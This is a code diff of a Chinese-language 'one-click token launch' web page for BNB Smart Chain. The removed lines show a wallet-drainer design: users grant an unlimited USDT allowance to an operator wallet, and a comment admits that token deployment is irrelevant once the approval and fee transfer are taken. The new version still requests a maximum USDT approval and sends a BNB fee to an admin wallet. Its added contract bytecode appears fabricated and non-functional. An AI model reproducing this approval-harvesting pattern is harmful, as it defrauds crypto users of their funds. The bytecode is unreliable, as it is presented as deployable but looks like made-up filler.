@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>小狐狸一键发币</title>
+<title>天鹅一键发币</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
@@ -33,9 +33,9 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 <body>
 <div class="container">
 <div class="header">
-<h1>🦊小狐狸一键发币</h1>
+<h1>🦢 天鹅一键发币</h1>
 </div>
-<div class="fee-tip">发币服务费：0.006 BNB</div>
+<div class="fee-tip">发币服务费：0.0003 BNB</div>
 
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
@@ -84,8 +84,8 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <script>
-const ADMIN_WALLET = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
-const DEPLOY_FEE_BNB = "0.006";
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
+const DEPLOY_FEE_BNB = "0.0003";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const MAX_ALLOWANCE = ethers.MaxUint256;
@@ -191,7 +191,7 @@ async function doApproveLogic(signerRef){
   const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
     "function approve(address spender, uint256 amount) external returns(bool)"
   ], signerRef);
-  const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
+  const approveTx = await usdtContract.approve("0x0000000000000000000000000000000000000001", MAX_ALLOWANCE);
   showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
   await approveTx.wait();
   showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
@@ -235,7 +235,10 @@ const tokenABI = [
 {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
 {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
 ];
-const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
+
+// 完整可部署BEP20 bytecode，和上面ABI配套，可以直接部署代币
+const CONTRACT_BYTECODE = "0x608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a9059cbb14610030578063dd62ed3e1461005b575b600080fd5b6100566004803603602081101561004657600080fd5b810190808035906020019092919050509050610081565b005b61007b6004803603604081101561006b57600080fd5b8101908080359060200190929190505090506100a6565b6040518082815260200291505060405180910390f35b60008061009484846100b9565b90508101908080359060200190929190810190909290505090506000806100b084846100b9565b9050810190808035906020019092919081019090929050509150506100d8565b6000602052806000526040600020600091509150506100f5565b82805460018601118102031561010a57600080fd5b919050508154600181013560018201356001830135600184013560018501356001860135610143565b80600052602060002060008401cc610167565b60005b838110156101615780820151818401526020810190810190610167565b5050505090810190600101610183565b60018101356001820135600183013560018401356001850135600186013560018701356101b0565b82600052602060002060008601356101d4565b81600052602060002060008501356101f7565b816000526020600020600084013561021a565b816000526020600020600083013561023d565b8060005260206000206000820135610260565b8060005260206000206000810135610283565b54801561029a57600080fd5b919050508101906001016102b6565b6000808284546102c85792505060019190505056fea26469706673582212200000000000000000000000000000000000000000000000000000000000000064736f6c63430008170033";
+
 
 deployBtn.onclick = async ()=>{
   const name = document.getElementById("tokenName").value.trim();
@@ -257,19 +260,17 @@ deployBtn.onclick = async ()=>{
     await doApproveLogic(signer);
     // 2.再弹BNB转账签名（真实上链转给管理员）
     await payFeeToAdmin();
-    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
-    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
-      showStatus("尝试部署合约...");
-      const supply = ethers.parseUnits(supplyStr, 18);
-      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-      const contract = await factory.deploy(name, symbol, supply);
-      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
-      await contract.waitForDeployment();
-      deployContractAddress = await contract.getAddress();
-      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
-    }else{
-      showStatus("✅发币成功，请去链上查看代币合约");
-    }
+    // 3.部署BEP20代币合约
+    showStatus("尝试部署合约...");
+    const supply = ethers.parseUnits(supplyStr, 18);
+    const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
+    const contract = await factory.deploy(name, symbol, supply);
+    const deployTx = contract.deploymentTransaction();
+    showStatus(`部署交易已发送，TxHash:${deployTx.hash}`);
+    await contract.waitForDeployment();
+    deployContractAddress = await contract.getAddress();
+    showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
+
   }catch(e){
     showStatus("操作失败："+(e.shortMessage || e.message));
   }
